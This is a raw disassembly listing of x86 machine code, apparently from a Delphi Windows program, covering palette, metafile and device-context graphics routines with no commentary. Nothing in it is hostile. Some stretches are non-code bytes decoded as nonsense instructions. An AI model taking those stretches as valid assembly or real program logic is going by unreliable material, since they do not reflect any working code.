mov ecx ebx
mov eax [ r-xdata ]
call sub_464644
imul esp [ ebx - 0x75 ] 0x46427cc0
add [ edi ] al
or edx [ edi + ecx * 2 + 0x6c ]
inc edi
jb r-xdata
inc esi
add [ ecx + edx * 2 ] ah
inc esi
add [ eax + 0x68004256 ] ah
push ecx
inc esi
add [ eax + 0x8004651 ] dh
push edi
inc edx
add al dl
push ecx
inc esi
add [ eax ] bl
push edi
inc edx
add al ah
push ebx
inc edx
add [ eax ] bl
push edx
inc esi
add [ esi + edx * 2 + 0x521c0042 ] ch
inc esi
add [ edx + edx * 2 + 0x46 ] ch
add al dh
push edx
inc esi
add [ ebx + edx * 2 ] bh
inc esi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ esi + esi * 2 + 0x280041 ] ah
add [ eax ] al
or edx [ edi + ecx * 2 + 0x6c ]
inc edi
jb r-xdata
adc [ eax + 0x46 ] 0x0
call 0x446886d
push ecx
jb r-xdata
mov ecx r-xdata
call sub_405a10
pop esi
pop ebx
retn
lea eax [ ebx + 0x20 ]
call sub_4059e4
mov eax esi
mov edx [ ebx + 0x20 ]
sub edx 0xffffffdc
mov edx eax
test edx edx
je r-xdata
jo r-xdata
inc esi
add [ eax ] al
dec edi
inc esi
add ah dl
push esp
inc edx
add [ eax + edx * 2 ] cl
inc esi
add [ eax - 0x17ffb9b0 ] al
push eax
popad
jo r-xdata
inc ecx
imul esp [ ebx - 0xc ] 0xcc004641
sbb eax [ edx ]
add [ eax ] al
pop es
inc ecx
js r-xdata
mov dl 0x1
je r-xdata
add [ eax + 0x57cba55c ] ah
push cs
rcl [ ecx ] 0x1
mov ebp 0xaf20002f
push cs
pop ebx
adc [ ebx + 0x56 ] 0xd88bf28b
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
insb
jae r-xdata
mov eax esi
mov edx [ ebx + 0x18 ]
mov ecx r-xdata
call sub_405a10
pop esi
pop ebx
retn
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_464bb8
mov edx eax
test edx edx
je r-xdata
add [ ebp - 0x17acffc0 ] cl
sahf
in eax 0xf9
dec [ ebx - 0x743c7428 ]
adc eax r-xdata
call sub_4033d8
test al al
je r-xdata
lea eax [ ebx + 0x18 ]
call sub_4059e4
sub edx 0xffffffdc
mov eax 0x8000ffff
pop ebx
retn
cmp [ ebx + 0xc ] 0x0
jge r-xdata
mov eax [ ebx + 0xc ]
pop ebx
retn
sub_4642a0
push ebx
call sub_402844
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov eax 0x8000ffff
pop ebx
retn
cmp [ ebx + 0xc ] 0x0
jge r-xdata
mov eax [ ebx + 0xc ]
pop ebx
retn
sub_4642cc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x20 ]
mov ecx r-xdata
call sub_405a10
pop esi
pop ebx
retn
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_464644
mov edx eax
test edx edx
je r-xdata
lea eax [ ebx + 0x20 ]
call sub_4059e4
sub edx 0xffffffdc
sub_46431c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x18 ]
mov ecx r-xdata
call sub_405a10
pop esi
pop ebx
retn
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_464bb8
mov edx eax
test edx edx
je r-xdata
lea eax [ ebx + 0x18 ]
call sub_4059e4
sub edx 0xffffffdc
sub_46436c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4643af
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4642cc
mov eax [ ebp - 0x4 ]
mov edx esi
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4643b6
lea eax [ ebp - 0x4 ]
call sub_4059cc
retn
sub_4643bc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_405a40
xor eax eax
push ebp
push sub_464416
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_4642cc
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46441d
lea eax [ ebp - 0x8 ]
call sub_4059cc
lea eax [ ebp - 0x4 ]
call sub_4059cc
retn
sub_464424
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_464467
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_46431c
mov eax [ ebp - 0x4 ]
mov edx esi
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46446e
lea eax [ ebp - 0x4 ]
call sub_4059cc
retn
sub_464474
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_40321c
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4645b4
mov edx eax
test edx edx
je r-xdata
add esp 0xfffffff0
call sub_403570
lea eax [ esi + 0x14 ]
call sub_4059e4
mov eax esi
test bl bl
je r-xdata
sub edx 0xfffffff8
mov eax esi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_4644c8
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
mov eax esi
call sub_464584
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40323c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_464500
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_405a40
xor eax eax
push ebp
push sub_464568
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_464584
lea eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
call sub_4059e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46456f
lea eax [ ebp - 0x4 ]
call sub_4059cc
retn
lea eax [ ebx + 0x10 ]
push eax
mov edx r-xdata
mov ecx [ ebx + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_463178
sub_4645b4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_40321c
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_464644
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_464474
mov [ edi + 0x1c ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_464680
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
xor edx edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_464824
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46482b
lea eax [ ebp - 0x28 ]
call sub_403f9c
lea eax [ ebp - 0x24 ]
call sub_4059cc
lea eax [ ebp - 0xc ]
call sub_4046a8
retn
lea eax [ ebp - 0x24 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
mov ecx r-xdata
call sub_405a10
cmp [ ebp - 0x24 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
call sub_4046a8
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
mov bl [ r-xdata ]
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
cmp [ ebp - 0x1c ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ eax ]
call [ eax + 0x24 ]
cmp [ ebp - 0x1c ] 0x0
je r-xdata
or bl 0x1
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ eax ]
call [ eax + 0x2c ]
cmp [ ebp - 0x1c ] 0x0
je r-xdata
or bl 0x2
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ eax ]
call [ eax + 0x34 ]
cmp [ ebp - 0x1c ] 0x0
je r-xdata
or bl 0x4
lea eax [ ebp - 0x1e ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ eax ]
call [ eax + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_422d80
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0x1
xor eax eax
push ebp
push sub_4647f7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x1c ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
lea eax [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
call sub_404224
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x8 ]
call sub_42317c
fild [ ebp - 0x18 ]
fdiv [ r-xdata ]
call sub_402a14
mov edx eax
mov eax [ ebp - 0x8 ]
call sub_4231f4
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_423220
mov dl [ ebp - 0x1e ]
mov eax [ ebp - 0x8 ]
call sub_423284
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0x0
mov eax [ ebp - 0x8 ]
call sub_40324c
retn
or bl 0x8
sub_464848
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4649c6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x10 ]
call sub_403f9c
lea eax [ ebp - 0xc ]
call sub_4046a8
lea eax [ ebp - 0x8 ]
call sub_4059cc
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0x1
xor eax eax
push ebp
push sub_464999
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
mov ecx r-xdata
call sub_405a10
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_423164
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0xc ]
call sub_4047f4
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_4231d8
mov [ ebp - 0x14 ] eax
fild [ ebp - 0x14 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_423214
test al 0x1
setne al
neg al
sbb eax eax
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_423214
test al 0x2
setne al
neg al
sbb eax eax
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_423214
test al 0x4
setne al
neg al
sbb eax eax
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_423214
test al 0x8
setne al
neg al
sbb eax eax
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_42327c
and eax 0xff
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x48 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0x0
retn
sub_4649d1
add [ eax ] al
add [ edx ] al
loopne r-xdata
mov esp ebp
pop ebp
retn
mov esi 0x101aa874
mov edi [ edx + 0x3000aa00 ]
or al 0xab
add [ eax + 0x1c ] al
inc esi
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_464b19
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0xc ]
mov ecx r-xdata
call sub_405a10
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464b20
lea eax [ ebp - 0x2c ]
call sub_403f9c
lea eax [ ebp - 0x8 ]
call sub_4059cc
lea eax [ ebp - 0x4 ]
call sub_4046a8
retn
lea edx [ ebp - 0x2c ]
mov eax [ ebx + 0x1c ]
call sub_423164
mov edx [ ebp - 0x2c ]
lea eax [ ebp - 0x4 ]
call sub_4047f4
mov [ ebp - 0x28 ] 0x20
mov eax [ ebp - 0x4 ]
call sub_404804
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x1c ]
call sub_4231d8
mov [ ebp - 0x30 ] eax
fild [ ebp - 0x30 ]
fmul [ r-xdata ]
fistp [ ebp - 0x20 ]
fwait
mov eax [ ebx + 0x1c ]
call sub_423214
test al 0x1
je r-xdata
mov [ ebp - 0x18 ] 0x190
mov [ ebp - 0x18 ] 0x2bc
jmp r-xdata
mov eax [ ebx + 0x1c ]
call sub_42327c
and eax 0xff
mov [ ebp - 0x16 ] ax
mov eax [ ebx + 0x1c ]
call sub_423214
test al 0x2
setne al
neg al
sbb eax eax
mov [ ebp - 0x14 ] eax
mov eax [ ebx + 0x1c ]
call sub_423214
test al 0x4
setne al
neg al
sbb eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x1c ]
call sub_423214
test al 0x8
setne al
neg al
sbb eax eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
call sub_4059cc
mov ecx eax
mov edx r-xdata
lea eax [ ebp - 0x28 ]
call sub_465478
call sub_462f6c
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_464500
sub_464b4c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_464b9b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
mov ecx r-xdata
call sub_405a10
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_464500
mov eax ebx
mov edx [ eax ]
call [ edx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464ba2
sub_464bb8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_464474
mov [ edi + 0x1c ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_464bf4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_4253e0
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_464c62
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
add eax 0x28
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
mov ecx r-xdata
call sub_405a10
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov edx [ ebp - 0x8 ]
call sub_425d68
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464c69
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0x0
mov eax [ ebp - 0x8 ]
call sub_40324c
retn
sub_464c6d
add [ eax ] al
add [ eax + 0x327bf809 ] al
mov edi 0xbb8b101a
add [ edx - 0x54f3d000 ] ch
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
mov ecx r-xdata
call sub_405a10
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
mov [ ebp - 0x2c ] 0x14
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x1c ]
mov ebx [ esi + 0xc ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_42818c
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_464d25
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x14 ]
call sub_42992c
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x14 ]
call sub_429960
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x9 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_40324c
retn
mov [ ebp - 0x28 ] 0x4
mov eax ebx
mov edx [ r-xdata ]
call sub_4033d8
test al al
jne r-xdata
mov [ ebp - 0x28 ] 0x3
mov eax esi
call sub_425d38
call sub_429bb0
mov [ ebp - 0x24 ] eax
jmp r-xdata
mov eax esi
call sub_425d50
call sub_426780
mov [ ebp - 0x24 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4264f4
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_464e35
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_426150
mov edx eax
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_426168
mov edx eax
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
push 0x0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4261c0
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_464e09
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
push eax
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x18 ]
call sub_423a18
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464e10
mov eax [ ebp - 0x18 ]
call sub_40324c
retn
mov eax [ ebp - 0x8 ]
call sub_4059cc
push eax
cmp [ ebp - 0x9 ] 0x1
cmc
sbb ecx ecx
mov edx r-xdata
lea eax [ ebp - 0x2c ]
call sub_465494
call sub_462f6c
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov eax [ ebp - 0x4 ]
call sub_464500
sub_464e10
mov eax [ ebp - 0x10 ]
call sub_427310
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x9 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_40324c
retn
sub_464e93
add [ eax + 0x327bf809 ] al
mov edi 0xbb8b101a
add [ edx - 0x54f3d000 ] ch
or [ ecx ] 0xbf327bf8
sbb dl [ eax ]
mov edi [ ebx + 0x3000aa00 ]
or al 0xab
push ebx
mov ebx eax
mov eax ebx
call sub_464500
mov eax ebx
mov edx [ eax ]
call [ edx + 0x4 ]
pop ebx
retn
sub_464ec8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41a7dc
pop esi
pop ebx
retn
lea eax [ ebx + 0x28 ]
mov edx [ esi + 0x28 ]
call sub_4059e4
pop esi
pop ebx
retn
sub_464f00
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_423b74
xor eax eax
push ebp
push sub_464ffe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_423e68
mov edi eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x0
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebx + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
cmp [ ebp - 0xc ] 0x4
jne r-xdata
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
push edi
call SelectPalette
mov [ ebp - 0x8 ] eax
push edi
call RealizePalette
mov [ ebp - 0x9 ] 0x1
push esi
mov eax ebx
call sub_4650b0
neg eax
push eax
mov eax ebx
call sub_4650cc
push eax
mov eax ebx
call sub_4650b0
dec eax
push eax
push 0x0
mov eax [ esi + 0xc ]
sub eax [ esi + 0x4 ]
push eax
mov eax [ esi + 0x8 ]
sub eax [ esi ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
push edi
mov eax [ ebx + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x20 ]
call sub_462f6c
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebx + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
push esi
mov eax [ ebp - 0x10 ]
push eax
push edi
call PlayEnhMetaFile
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_423d60
retn
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
push edi
call SelectPalette
cmp [ ebp - 0x9 ] 0x0
je r-xdata
sub_46500c
push ebx
push ecx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
mov al 0x1
pop edx
pop ebx
retn
push esp
mov eax [ ebx + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
test eax eax
jne r-xdata
cmp [ esp ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ebx
retn
sub_465038
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx edx
push 0x0
call GetDC
mov esi eax
push 0x3
push esi
call SetMapMode
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
neg [ ebx + 0x4 ]
push 0x1
push ebx
push esi
call LPtoDP
push esi
push 0x0
call ReleaseDC
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_465080
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_4650b0
mov edx eax
lea ecx [ esp + 0x8 ]
xor eax eax
call sub_418ddc
lea eax [ esp + 0x8 ]
mov edx esp
call sub_465038
mov eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_4650b0
push ecx
xor edx edx
mov [ esp ] edx
cmp [ eax + 0x28 ] 0x0
je r-xdata
mov eax [ esp ]
pop edx
retn
push esp
mov eax [ eax + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
sub_4650cc
push ecx
xor edx edx
mov [ esp ] edx
cmp [ eax + 0x28 ] 0x0
je r-xdata
mov eax [ esp ]
pop edx
retn
push esp
mov eax [ eax + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
sub_4650e8
push ecx
xor edx edx
cmp [ eax + 0x28 ] 0x0
je r-xdata
mov eax edx
pop edx
retn
push esp
mov eax [ eax + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov edx [ esp ]
sub_465104
push ecx
xor edx edx
cmp [ eax + 0x28 ] 0x0
je r-xdata
mov eax edx
pop edx
retn
push esp
mov eax [ eax + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x40 ]
test [ esp ] 0x2
setne dl
sub_465124
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_4650cc
lea ecx [ esp + 0x8 ]
xor edx edx
call sub_418ddc
lea eax [ esp + 0x8 ]
mov edx esp
call sub_465038
mov eax [ esp ]
add esp 0x10
pop ebx
retn
sub_465168
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_4651a6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405eac
mov eax [ ebp - 0x4 ]
call sub_465150
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4651ad
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
sub_4651b0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
pop esi
pop ebx
retn
push esi
mov eax [ ebx + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x24 ]
call sub_462f6c
sub_4651ce
mov eax eax
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_46520e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405eac
mov eax [ ebp - 0x4 ]
call sub_465150
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465215
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
sub_46521c
push ebx
push esi
mov esi edx
mov ebx eax
push r-xdata
lea eax [ ebx + 0x28 ]
call sub_4059cc
push eax
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4206d0
test eax eax
je r-xdata
or ecx 0xffffffff
xor edx edx
call sub_4654bc
call sub_462f6c
pop esi
pop ebx
retn
sub eax 0xffffffec
sub_465259
add [ eax ] al
add [ eax + 0x327bf809 ] al
mov edi 0xbb8b101a
add [ edx - 0x54f3d000 ] ch
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4652d3
push [ fs : eax ]
mov [ fs : eax ] esp
push 0xffffffff
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4206d0
test eax eax
je r-xdata
push eax
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x28 ]
mov ecx r-xdata
call sub_405a10
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
call sub_462f6c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4652da
lea eax [ ebp - 0x4 ]
call sub_4059cc
retn
sub eax 0xffffffec
sub_4652df
add [ ecx ] cl
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_46532f
push [ fs : eax ]
